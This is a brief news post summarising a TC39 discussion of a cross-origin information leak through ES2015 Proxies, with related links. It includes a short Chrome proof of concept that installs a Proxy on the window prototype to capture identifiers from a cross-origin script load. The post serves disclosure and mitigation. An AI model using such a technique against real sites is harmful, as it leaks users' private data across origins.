---
layout: news
title: 'How should browsers mitigate Proxy-related security issues? · Issue #272 · tc39/ecma262'
item-url: 'https://github.com/tc39/ecma262/issues/272'
date: '2015-12-26T16:28:51+00:00'
tags:
  - ECMAScript
  - Security
  - browser
related:
  - title: 'Issue 399951 - chromium - Security: Cross-origin information leak via ECMAScript harmony proxies - An open-source project to help move the web forward. - Google Project Hosting'
    url: 'https://code.google.com/p/chromium/issues/detail?id=399951'
  - title: 'CAPEC - CAPEC-111: JSON Hijacking (aka JavaScript Hijacking) (Version 2.8) ﻿'
    url: 'http://capec.mitre.org/data/definitions/111.html'
---
TC39 discuss about potential security issue of ES6 Proxy.

> There's a security issue on the web with ES2015 Proxies where a cross-origin request can be made to load some ECMAScript code, and this request can leak some information across origins due to the existence of Proxies. 

POC on Chrome:

```html
<script>
window.__proto__ = Proxy.create({
    get: function(target, name) {console.log("data=" + name)}
});
</script>
<script src="http://victim/test.csv"></script>
```

Firefox lock down `Object.prototype`.

This issue is similar to JSON Hijacking.

